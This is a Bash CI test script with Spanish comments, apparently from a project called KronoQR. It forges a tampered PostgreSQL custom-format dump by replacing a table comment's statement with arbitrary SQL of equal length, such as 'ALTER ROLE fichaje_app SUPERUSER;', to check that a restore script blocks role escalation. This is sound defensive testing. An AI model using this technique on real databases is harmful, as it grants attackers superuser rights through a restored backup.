#!/usr/bin/env bash
#
# KronoQR — fabrica un volcado MANIPULADO a proposito, para la prueba de que
# `restore.sh` no deja que una copia toque los roles del cluster (AUD-1, A3-01).
#
# NO ES UN ENTREGABLE: vive en .github/scripts/ y solo lo ejecuta la CI (el
# simulacro de restauracion). Un volcado `pg_dump -Fc` guarda la sentencia de cada
# objeto como texto en su tabla de contenido, sin firma ni suma de verificacion.
# El truco es sustituir, en el fichero, la sentencia de un `COMMENT ON` por la
# sentencia maliciosa, rellenando con espacios hasta la MISMA longitud para no
# desplazar ningun byte ni romper las longitudes que el formato guarda:
#
#   1. crea una base desechable con una tabla y un comentario de 60 `X`;
#   2. la vuelca en formato custom;
#   3. sustituye el `COMMENT ON ... 'XXXX...';` por la sentencia dada;
#   4. borra la base desechable.
#
# El resultado, pasado por `pg_restore`, ejecuta la sentencia con los permisos de
# quien restaura (el superusuario, en `restore.sh`).
#
# Uso:
#   PGHOST=... PGPORT=... PGUSER=... PGPASSWORD=... \
#     forge-role-escalation-dump.sh DESTINO.dump 'ALTER ROLE fichaje_app SUPERUSER;'
#
# La sentencia no puede pasar de 63 caracteres (la longitud del original menos el
# salto de linea). Codigos de salida: 0 hecho · 1 no se ha podido fabricar · 2 uso.

set -euo pipefail
IFS=$'\n\t'

[ "$#" -eq 2 ] || {
  printf 'uso: forge-role-escalation-dump.sh DESTINO.dump SENTENCIA_SQL\n' >&2
  exit 2
}

DESTINO="$1"
SENTENCIA="$2"
readonly DESTINO SENTENCIA
readonly BASE="kq_forge_src"

TRABAJO="$(mktemp -d)"
readonly TRABAJO
al_salir() {
  psql -d postgres -Atqc "DROP DATABASE IF EXISTS ${BASE}" >/dev/null 2>&1 || true
  rm -rf "${TRABAJO}"
}
trap al_salir EXIT

psql -d postgres -Atqc "DROP DATABASE IF EXISTS ${BASE}" -c "CREATE DATABASE ${BASE}" >/dev/null
psql -d "${BASE}" -Atq -v ON_ERROR_STOP=1 \
  -c "CREATE TABLE public.zzmarker (id integer)" \
  -c "COMMENT ON TABLE public.zzmarker IS 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'"
pg_dump -d "${BASE}" --format=custom -f "${TRABAJO}/origen.dump"

FORGE_SQL="${SENTENCIA}" perl -0777 -e '
  my $origen = "COMMENT ON TABLE public.zzmarker IS \x27" . ("X" x 60) . "\x27;\n";
  my $nuevo  = $ENV{FORGE_SQL};
  die "la sentencia no cabe: " . length($nuevo) . " caracteres, maximo " . (length($origen) - 1) . "\n"
    if length($nuevo) > length($origen) - 1;
  $nuevo .= " " x (length($origen) - length($nuevo) - 1) . "\n";
  open my $in, "<:raw", $ARGV[0] or die "no se puede leer $ARGV[0]\n";
  my $volcado = <$in>;
  close $in;
  my $i = index($volcado, $origen);
  die "el volcado no contiene el comentario esperado\n" if $i < 0;
  substr($volcado, $i, length($origen)) = $nuevo;
  open my $out, ">:raw", $ARGV[1] or die "no se puede escribir $ARGV[1]\n";
  print $out $volcado;
  close $out;
' "${TRABAJO}/origen.dump" "${DESTINO}" || {
  printf 'No se ha podido fabricar el volcado manipulado (mira el motivo arriba).\n' >&2
  exit 1
}

printf 'Volcado manipulado escrito en %s con la sentencia: %s\n' "${DESTINO}" "${SENTENCIA}"
